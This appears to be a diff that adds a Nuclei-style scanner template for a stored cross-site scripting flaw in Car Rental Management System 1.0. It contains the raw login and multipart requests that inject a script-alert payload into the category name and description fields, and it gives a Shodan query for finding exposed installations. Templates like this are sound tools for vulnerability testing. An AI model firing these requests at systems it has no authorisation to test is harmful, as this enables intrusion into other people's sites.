@@ -1,0 +1,71 @@
+id: carrental-xss
+
+info:
+  name: Car Rental Management System 1.0 - Cross-Site Scripting
+  author: arafatansari
+  severity: medium
+  description: |
+    Car Rental Management System 1.0 contains a cross-site scripting vulnerability via admin/ajax.php?action=save_category in Name and Description parameter.
+  reference:
+    - https://www.exploit-db.com/exploits/49546
+    - https://www.sourcecodester.com/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    shodan-query: http.html:"Car Rental Management System"
+  tags: xss,cms,authenticated,edb
+
+requests:
+  - raw:
+      - |
+        POST /admin/ajax.php?action=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+
+      - |
+        POST /admin/ajax.php?action=save_category HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCMJ5bh3B6m9767Em
+
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="id"
+
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="name"
+
+        </script><script>alert(document.domain)</script>
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="description"
+
+        <script>alert(document.domain)</script>
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em--
+
+      - |
+        GET /admin/index.php?page=categories HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by md on 2022/09/19
